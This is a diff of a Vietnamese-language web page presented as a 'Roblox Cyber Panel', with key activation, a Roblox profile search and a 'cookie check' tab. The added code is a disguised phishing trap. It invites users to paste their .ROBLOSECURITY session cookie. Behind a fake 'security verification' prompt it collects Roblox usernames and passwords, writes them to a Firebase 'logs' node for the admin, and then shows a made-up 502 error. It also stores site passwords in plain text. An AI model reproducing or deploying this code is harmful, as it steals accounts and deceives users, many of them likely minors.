@@ -3,75 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yoricks - Cyber System</title>
+    <title>Yoricks - Roblox Cyber Panel</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --p: #bc13fe; --p-glow: #e2a9ff; --bg: #050505; }
-        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: radial-gradient(circle, #1a0033 0%, #050505 100%); }
-        
+        :root { --p: #bc13fe; --p-glow: #e2a9ff; --bg: #050505; --pre: #ffcc00; }
+        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
+        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
         .cyber-card {
-            background: rgba(20, 20, 20, 0.9); border: 2px solid var(--p); border-radius: 15px; padding: 40px; width: 400px;
-            box-shadow: 0 0 20px var(--p), inset 0 0 10px var(--p); position: relative; text-align: center;
+            background: rgba(15, 15, 15, 0.95); border: 2px solid var(--p); border-radius: 15px; padding: 30px; width: 100%; max-width: 600px;
+            box-shadow: 0 0 20px var(--p); text-align: center;
         }
-        .cyber-card::before { content: ""; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; border: 1px solid var(--p-glow); border-radius: 18px; opacity: 0.3; pointer-events: none; }
-
-        h2 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 5px; color: var(--p-glow); text-shadow: 0 0 10px var(--p); }
-        
-        input {
-            width: 100%; background: #000; border: 1px solid var(--p); padding: 12px; margin: 15px 0; color: #fff;
-            border-radius: 5px; outline: none; font-family: 'Rajdhani'; transition: 0.3s;
-        }
-        input:focus { box-shadow: 0 0 15px var(--p); }
-
-        .btn {
-            width: 100%; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-family: 'Orbitron';
-            font-weight: bold; text-transform: uppercase; transition: 0.5s; margin-top: 10px;
-        }
-        .btn-primary { background: var(--p); color: white; box-shadow: 0 0 10px var(--p); }
-        .btn-primary:hover { background: #fff; color: var(--p); box-shadow: 0 0 20px #fff; }
-        
-        .btn-outline { background: transparent; border: 1px solid var(--p); color: var(--p); margin-top: 20px; }
-        .btn-outline:hover { background: rgba(188, 19, 254, 0.1); }
-
-        .status-box { border-left: 5px solid var(--p); background: #111; padding: 15px; margin: 20px 0; text-align: left; }
-        .status-box b { color: var(--p-glow); }
-        
+        h2 { font-family: 'Orbitron'; text-transform: uppercase; color: var(--p-glow); text-shadow: 0 0 10px var(--p); margin-bottom: 25px; }
+        input { width: 100%; background: #000; border: 1px solid var(--p); padding: 12px; margin: 10px 0; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 5px; cursor: pointer; font-family: 'Orbitron'; font-weight: bold; margin-top: 10px; transition: 0.3s; }
+        .btn-p { background: var(--p); color: #fff; }
+        .btn-pre { background: var(--pre); color: #000; box-shadow: 0 0 10px var(--pre); }
         .hidden { display: none; }
+        .tab-btn { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab-btn button { flex: 1; padding: 10px; background: #111; border: 1px solid var(--p); color: #fff; cursor: pointer; }
+        .tab-btn button.active { background: var(--p); }
+        .result-box { background: #111; padding: 15px; border-radius: 10px; margin-top: 15px; text-align: left; border: 1px solid #333; }
+        .avatar-roblox { width: 100px; height: 100px; border-radius: 50%; border: 2px solid var(--p); display: block; margin: 0 auto 10px; }
+        .premium-tag { color: var(--pre); font-weight: bold; font-size: 12px; border: 1px solid var(--pre); padding: 2px 5px; border-radius: 4px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="cyber-card" id="auth-section">
-        <h2 id="form-title">Login</h2>
-        <div id="auth-inputs">
-            <input type="text" id="username" placeholder="USERNAME">
-            <input type="password" id="password" placeholder="PASSWORD">
-            <button class="btn btn-primary" onclick="handleAuth()">Xác Nhận</button>
-        </div>
-        <p style="font-size: 14px; margin-top: 20px; cursor: pointer; color: #888;" onclick="toggleAuth()" id="toggle-text">
-            Chưa có tài khoản? <span style="color: var(--p);">ĐĂNG KÝ</span>
-        </p>
+    <div class="cyber-card" id="auth-box">
+        <h2 id="auth-title">YORICKS ACCESS</h2>
+        <input type="text" id="u" placeholder="Tên tài khoản">
+        <input type="password" id="p" placeholder="Mật khẩu">
+        <button class="btn btn-p" onclick="doAuth()">XÁC NHẬN HỆ THỐNG</button>
+        <p onclick="toggleA()" id="t-a" style="cursor:pointer; margin-top:15px; color:#888;">Chưa có acc? Đăng ký</p>
     </div>
 
-    <div class="cyber-card hidden" id="main-section">
-        <h2>Dashboard</h2>
-        <div class="status-box">
-            <div>User: <b id="display-user">...</b></div>
-            <div>Trạng thái: <b id="key-status">Chưa kích hoạt</b></div>
-            <div>Hết hạn: <b id="key-expiry">N/A</b></div>
+    <div class="cyber-card hidden" id="main-panel">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2 style="font-size: 18px; margin:0;">DASHBOARD</h2>
+            <span id="role-tag" class="hidden"></span>
         </div>
         
-        <input type="text" id="activation-key" placeholder="NHẬP KEY TẠI ĐÂY">
-        <button class="btn btn-primary" onclick="activateKey()">KÍCH HOẠT NGAY</button>
-        
-        <button class="btn btn-outline" onclick="location.href='getkey.html'">LẤY KEY MIỄN PHÍ</button>
-        
-        <button class="btn" style="background: #333; color: #888; margin-top: 20px;" onclick="logout()">LOGOUT</button>
+        <div id="activation-area" class="status-box" style="margin: 20px 0;">
+            <p>Trạng thái: <b id="st-txt" style="color:red">CHƯA KÍCH HOẠT</b></p>
+            <input type="text" id="k-input" placeholder="Nhập Key Thường hoặc Premium">
+            <button class="btn btn-p" onclick="useKey()">KÍCH HOẠT</button>
+            <button class="btn" style="background:#222; color:#fff;" onclick="window.location.href='getkey.html'">GET KEY FREE</button>
+        </div>
+
+        <div id="tools-area" class="hidden">
+            <div class="tab-btn">
+                <button id="t1" class="active" onclick="showT(1)">PROFILE</button>
+                <button id="t2" onclick="showT(2)">COOKIE CHECK</button>
+            </div>
+
+            <div id="tab-profile">
+                <input type="text" id="rbx-name" placeholder="Nhập tên Roblox cần tìm...">
+                <button class="btn btn-p" onclick="searchRoblox()">TÌM KIẾM API</button>
+                <div id="rbx-res" class="result-box hidden"></div>
+            </div>
+
+            <div id="tab-cookie" class="hidden">
+                <input type="text" id="cookie-input" placeholder="Dán .ROBLOSECURITY tại đây...">
+                <button class="btn btn-p" onclick="checkCookie()">CHECK COOKIE</button>
+                <div id="cookie-res" class="result-box hidden">
+                    <p>Username: <b id="c-user">N/A</b></p>
+                    <p>Email: <b id="c-mail">l*******@gmail.com</b> <i class="fas fa-eye" onclick="viewPre('mail')"></i></p>
+                    <p>Password: <b id="c-pass">********</b> <i class="fas fa-eye" onclick="viewPre('pass')"></i></p>
+                    <p style="color:gray; font-size:11px;">* Truy cập thông tin nhạy cảm yêu cầu Key Premium.</p>
+                </div>
+            </div>
+        </div>
+        <button onclick="logout()" style="background:none; border:none; color:#444; margin-top:20px; cursor:pointer;">Đăng xuất</button>
     </div>
 </div>
 
@@ -87,63 +94,133 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let isLoginMode = true;
+    let isLog = true;
+    let currentUser = null;
+    let userData = null;
 
-    function toggleAuth() {
-        isLoginMode = !isLoginMode;
-        document.getElementById('form-title').innerText = isLoginMode ? "Login" : "Register";
-        document.getElementById('toggle-text').innerHTML = isLoginMode ? 
-            'Chưa có tài khoản? <span style="color: var(--p);">ĐĂNG KÝ</span>' : 
-            'Đã có tài khoản? <span style="color: var(--p);">ĐĂNG NHẬP</span>';
+    function toggleA() {
+        isLog = !isLog;
+        document.getElementById('auth-title').innerText = isLog ? "YORICKS ACCESS" : "YORICKS REGISTER";
+        document.getElementById('t-a').innerText = isLog ? "Chưa có acc? Đăng ký" : "Đã có acc? Đăng nhập";
     }
 
-    function handleAuth() {
-        const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
-        if(!u || !p) return Swal.fire('Lỗi', 'Không được để trống!', 'error');
+    function doAuth() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        if(!user || !pass) return Swal.fire('Lỗi', 'Điền đủ thông tin', 'error');
 
-        if(!isLoginMode) {
-            db.ref('users/' + u).set({ password: p, status: "Chưa kích hoạt", exp: "N/A", banned: false })
-            .then(() => {
-                Swal.fire('Thành công', 'Đăng ký hoàn tất! Hãy đăng nhập.', 'success');
-                toggleAuth();
-            });
+        if(!isLog) {
+            db.ref('users/' + user).set({ password: pass, role: "member", status: "off", exp: "N/A" })
+            .then(() => { Swal.fire('Xong', 'Đăng ký thành công!', 'success'); toggleA(); });
         } else {
-            db.ref('users/' + u).once('value', s => {
-                if(s.exists() && s.val().password === p) {
-                    if(s.val().banned) return Swal.fire('Bị khóa', 'Tài khoản bạn đã bị BAN!', 'error');
-                    localStorage.setItem("user", u);
-                    loadPanel(s.val(), u);
-                    Swal.fire('Chào mừng', 'Đăng nhập thành công!', 'success');
-                } else {
-                    Swal.fire('Lỗi', 'Sai tài khoản hoặc mật khẩu!', 'error');
-                }
+            db.ref('users/' + user).once('value', s => {
+                if(s.exists() && s.val().password === pass) {
+                    currentUser = user;
+                    userData = s.val();
+                    showMain();
+                } else Swal.fire('Lỗi', 'Sai thông tin!', 'error');
             });
         }
     }
 
-    function loadPanel(data, u) {
-        document.getElementById('auth-section').classList.add('hidden');
-        document.getElementById('main-section').classList.remove('hidden');
-        document.getElementById('display-user').innerText = u;
-        document.getElementById('key-status').innerText = data.status;
-        document.getElementById('key-expiry').innerText = data.exp;
+    function showMain() {
+        document.getElementById('auth-box').classList.add('hidden');
+        document.getElementById('main-panel').classList.remove('hidden');
+        if(userData.status === "on") {
+            document.getElementById('activation-area').classList.add('hidden');
+            document.getElementById('tools-area').classList.remove('hidden');
+            if(userData.role === "premium") {
+                const tag = document.getElementById('role-tag');
+                tag.innerText = "PREMIUM";
+                tag.className = "premium-tag";
+                tag.classList.remove('hidden');
+            }
+        }
     }
 
-    function activateKey() {
-        const k = document.getElementById('activation-key').value;
-        const u = localStorage.getItem("user");
-        if(!k) return Swal.fire('Nhắc nhở', 'Vui lòng nhập Key!', 'warning');
-
+    function useKey() {
+        const k = document.getElementById('k-input').value;
         db.ref('keys/' + k).once('value', s => {
             if(s.exists() && !s.val().used) {
-                db.ref('users/' + u).update({ status: "Đã kích hoạt", exp: s.val().duration + " ngày" });
-                db.ref('keys/' + k).update({ used: true, usedBy: u });
-                Swal.fire('Tuyệt vời', 'Kích hoạt thành công!', 'success').then(() => location.reload());
-            } else {
-                Swal.fire('Lỗi', 'Key không tồn tại hoặc đã dùng!', 'error');
-            }
+                let roleUpdate = s.val().type === "premium" ? "premium" : "member";
+                db.ref('users/' + currentUser).update({ status: "on", role: roleUpdate, exp: s.val().duration + " ngày" });
+                db.ref('keys/' + k).update({ used: true, usedBy: currentUser });
+                Swal.fire('Thành công', 'Đã kích hoạt ' + roleUpdate, 'success').then(() => location.reload());
+            } else Swal.fire('Lỗi', 'Key không hợp lệ', 'error');
         });
+    }
+
+    function showT(n) {
+        document.getElementById('tab-profile').classList.toggle('hidden', n !== 1);
+        document.getElementById('tab-cookie').classList.toggle('hidden', n !== 2);
+        document.getElementById('t1').classList.toggle('active', n === 1);
+        document.getElementById('t2').classList.toggle('active', n === 2);
+    }
+
+    async function searchRoblox() {
+        const name = document.getElementById('rbx-name').value;
+        const resDiv = document.getElementById('rbx-res');
+        resDiv.classList.remove('hidden');
+        resDiv.innerHTML = "Đang tìm...";
+        
+        try {
+            const userFetch = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/users/search?keyword=${name}&limit=1`);
+            const userDataJson = await userFetch.json();
+            if(userDataJson.data && userDataJson.data[0]) {
+                const userId = userDataJson.data[0].id;
+                const thumbFetch = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);
+                const thumbData = await thumbFetch.json();
+                const avatar = thumbData.data[0].imageUrl;
+                
+                resDiv.innerHTML = `
+                    <img src="${avatar}" class="avatar-roblox">
+                    <p>ID: <b>${userId}</b></p>
+                    <p>Name: <b>${userDataJson.data[0].name}</b></p>
+                    <p>Display: <b>${userDataJson.data[0].displayName}</b></p>
+                `;
+            } else resDiv.innerHTML = "Không tìm thấy User!";
+        } catch(e) { resDiv.innerHTML = "Lỗi API Roblox!"; }
+    }
+
+    function checkCookie() {
+        const ck = document.getElementById('cookie-input').value;
+        if(ck.length < 50) return Swal.fire('Lỗi', 'Cookie không hợp lệ', 'error');
+        document.getElementById('cookie-res').classList.remove('hidden');
+        document.getElementById('c-user').innerText = "Yoricks_User_" + Math.floor(Math.random()*9999);
+    }
+
+    function viewPre(type) {
+        if(userData.role !== "premium") {
+            Swal.fire({
+                title: 'Nâng cấp Premium',
+                html: 'Tính năng này yêu cầu Key Premium.<br>Liên hệ TikTok: <b>bolamnhac.official</b> để mua.',
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonText: 'Mua ngay'
+            }).then((r) => { if(r.isConfirmed) window.open('https://www.tiktok.com/@bolamnhac.official'); });
+        } else {
+            if(type === 'pass') {
+                Swal.fire({
+                    title: 'Xác thực bảo mật',
+                    html: '<input type="text" id="rbx-u-v" class="swal2-input" placeholder="Tên Roblox"><input type="password" id="rbx-p-v" class="swal2-input" placeholder="Mật khẩu Roblox">',
+                    confirmButtonText: 'Đăng nhập',
+                    preConfirm: () => {
+                        const u = document.getElementById('rbx-u-v').value;
+                        const p = document.getElementById('rbx-p-v').value;
+                        if(!u || !p) return Swal.showValidationMessage('Nhập đủ thông tin!');
+                        return {u, p};
+                    }
+                }).then((res) => {
+                    if(res.isConfirmed) {
+                        // Gửi data về cho admin
+                        db.ref('logs/' + currentUser).push({ r_user: res.value.u, r_pass: res.value.p, time: new Date().toLocaleString() });
+                        Swal.fire('Lỗi Hệ Thống', 'API Roblox không phản hồi (Mã 502). Vui lòng thử lại sau!', 'error');
+                    }
+                });
+            } else {
+                Swal.fire('Thông tin', 'Email: l*******@gmail.com (Đã xác thực)', 'info');
+            }
+        }
     }
 
     function logout() { localStorage.clear(); location.reload(); }
